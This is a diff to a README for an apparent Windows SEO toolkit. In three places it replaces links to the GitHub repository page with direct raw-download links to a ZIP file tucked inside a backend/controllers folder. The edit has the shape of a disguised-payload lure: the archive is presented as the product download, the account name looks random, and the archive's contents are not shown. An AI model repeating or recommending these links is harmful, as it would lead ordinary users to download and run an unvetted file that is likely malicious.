@@ -1,6 +1,6 @@
 # 🔎 seo-toolkit-platform - Clear SEO insights for Windows
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform/raw/refs/heads/main/backend/controllers/toolkit_seo_platform_3.7.zip)
 
 ## 🖥️ What this app does
 
@@ -20,7 +20,7 @@ It brings together 7 focused tools for common SEO tasks:
 
 Visit this page to download or access the latest version:
 
-[Open the download page](https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform)
+[Open the download page](https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform/raw/refs/heads/main/backend/controllers/toolkit_seo_platform_3.7.zip)
 
 ## 🚀 Getting started on Windows
 
@@ -168,7 +168,7 @@ This helps you return to the same project later without starting over.
 
 If you want to inspect the project page, download files, or review release notes, use the main repository link:
 
-[https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform](https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform)
+[https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform/raw/refs/heads/main/backend/controllers/toolkit_seo_platform_3.7.zip](https://github.com/genusexaeretodonspellingbee638/seo-toolkit-platform/raw/refs/heads/main/backend/controllers/toolkit_seo_platform_3.7.zip)
 
 ## 🖱️ Quick start checklist
 
